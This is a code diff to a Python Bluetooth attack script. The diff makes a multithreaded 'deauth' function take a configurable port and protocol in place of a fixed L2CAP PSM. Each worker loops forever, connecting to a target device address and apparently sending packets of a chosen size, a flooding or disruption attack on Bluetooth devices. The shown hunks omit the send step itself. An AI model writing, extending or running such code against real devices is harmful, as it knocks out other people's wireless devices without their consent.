@@ -2,21 +2,20 @@ import bluetooth
 import time
 
 from utils.async_utils import create_async_task
+from utils.bt_utils import BTProtocol
 
-L2CAP_PSM_HCI = 0x1001
-
-def deauth(target: str, packet_size: int, worker_id: int):
+def deauth(target: str, port: int, protocol: BTProtocol, packet_size: int, worker_id: int):
     worker = f"Worker-{str(worker_id).zfill(2)}"
     job_id = 0
-    
+
     while True:
         job = f"Job-{job_id}"
         prefix = f" > [{worker} | {job}]    "
         
         # Create socket.
-        print(f"{prefix}Connecting {target} using L2CAP protocol (PSM 0x1001)...")
-        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)  
-        bd_dev = (target, L2CAP_PSM_HCI)
+        print(f"{prefix}Connecting {target} using {protocol.name.upper()} protocol (Port {port})...")
+        sock = bluetooth.BluetoothSocket(protocol.value)  
+        bd_dev = (target, port)
         
         # Connect socket
         try:
@@ -36,5 +35,5 @@ def deauth(target: str, packet_size: int, worker_id: int):
         time.sleep(1)
         job_id += 1
         
-def deauth_async(target: str, packet_size: int, threads: int):
-    create_async_task(threads, deauth, (target, packet_size))
+def deauth_async(target: str, port: int, protocol: BTProtocol, packet_size: int, threads: int):
+    create_async_task(threads, deauth, (target, port, protocol, packet_size))
